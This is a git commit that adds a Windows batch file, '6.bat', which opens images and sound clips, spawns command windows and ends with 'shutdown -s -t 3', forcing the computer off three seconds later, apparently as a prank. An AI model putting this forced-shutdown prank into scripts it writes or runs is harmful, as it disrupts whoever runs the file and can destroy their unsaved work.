7e7751c6324a432bab659bfe1b048ed8415f90ff
BABAlePaf <comptetwitch543@gmail.com>
2025-07-08 00:14:28 +0200

    Add files via upload

---
+++ Nouveau dossier/6.bat
@@ -0,0 +1,20 @@
+timeout 5
+start image.ico
+start ouille-aie.mp3
+timeout 2
+start image2.ico
+
+timeout 2 
+start image.ico
+
+timeout 2
+start image.ico
+start image2.ico
+start cmd
+start image.ico
+start image2.ico
+
+start cmd
+start tuco-get-out.mp3
+shutdown -s -t 3
+
